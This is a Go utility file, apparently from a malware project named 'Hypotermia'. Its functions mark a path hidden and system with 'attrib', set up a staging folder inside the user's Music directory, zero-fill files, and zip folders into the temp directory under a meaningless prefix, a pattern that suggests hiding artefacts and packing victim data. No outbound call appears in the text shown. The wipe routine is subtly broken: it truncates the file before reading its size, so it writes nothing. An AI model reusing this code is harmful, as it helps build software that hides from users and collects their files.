package utils

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"

	"Hypotermia/config"
)

func HideItem(path string) error {
	cmd := exec.Command("attrib", "+H", "+S", path)
	err := cmd.Run()

	if err != nil {
		return err
	}

	return nil
}

func GetMainFolder() string {
	return filepath.Join(os.Getenv("USERPROFILE"), "Music", config.HypotermiaName+"-"+config.Identifier)
}

func OverwriteFile(path string) error {
	file, err := os.OpenFile(path, os.O_RDWR|os.O_TRUNC, 0666)
	if err != nil {
		return err
	}

	defer file.Close()

	stat, err := file.Stat()
	if err != nil {
		return err
	}

	_, err = file.Write(make([]byte, stat.Size()))
	if err != nil {
		return err
	}

	return nil
}

func ZipFolder(path string) (string, error) {
	buffer := new(bytes.Buffer)
	zipWriter := zip.NewWriter(buffer)

	err := filepath.Walk(path, func(dir string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if info.IsDir() {
			return nil
		}

		file, err := os.Open(dir)
		if err != nil {
			return err
		}

		defer file.Close()

		ioWriter, err := zipWriter.Create(dir[len(path):])
		if err != nil {
			return err
		}

		_, err = io.Copy(ioWriter, file)
		if err != nil {
			return err
		}

		return nil
	})

	if err != nil {
		return "", err
	}

	zipWriter.Close()

	zipped := fmt.Sprintf("%s_%s.zip", GetZipFilePrefix(), filepath.Base(path))
	zippedPath := filepath.Join(os.TempDir(), zipped)

	err = os.WriteFile(zippedPath, buffer.Bytes(), 0644)
	if err != nil {
		return "", err
	}

	return zippedPath, nil
}

func GetZipFilePrefix() string {
	return "frsjk"
}
